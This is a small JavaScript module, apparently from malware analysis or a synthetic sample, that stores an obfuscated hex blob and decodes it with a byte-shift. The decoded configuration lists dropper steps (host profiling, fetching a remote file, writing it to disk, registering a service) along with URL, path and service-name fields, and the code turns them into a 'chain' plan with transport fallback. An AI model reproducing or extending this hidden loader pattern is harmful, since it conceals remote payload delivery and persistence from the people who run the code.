// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_bc60a059 = "7a4135807778697477417476736a6d7069636c73777830656775796d766963766971737869307b766d7869636a6d706930676c65726b69637173686930686d77746578676c6374767367697777806568657478697641717970786d63787665727774737678636a6570706665676f807778656b6963677379727841398067657174656d6b72636d6841525348493146383d4548383d4980797670416c787874773e3333727368693166383d6568383d6967383a3732697c6571747069326d727a65706d683365746d807977697663656b69727841527368694579686d783366383d65806a6d7069637465786c4133787174336c79727876697777317273686933327778656b693166383d6568383d6967383a3732716e77806576676c6374767366694174767367697777326576676c807769767a6d6769637265716941727368693166383d656838327769767a6d6769";
const Codec_bc60a059 = "hex_buffer|add_modulo_256|04";

function load_bc60a059() { return [...Buffer.from(Material_bc60a059, "hex")]; }
function decode_bc60a059(e) { return e.map((value) => (value - 4 + 256) & 255); }
async function recover_bc60a059() {
  const n = "";
  const e = load_bc60a059(); let d = [];
  d = await (async () => decode_bc60a059(e))();
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_bc60a059() { return await recover_bc60a059(); }
async function plan_bc60a059() { const inspect = inspect_bc60a059; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "multi_transport_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }
void moduleShape; void plan_bc60a059;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_bc60a059());

// reconstruction complete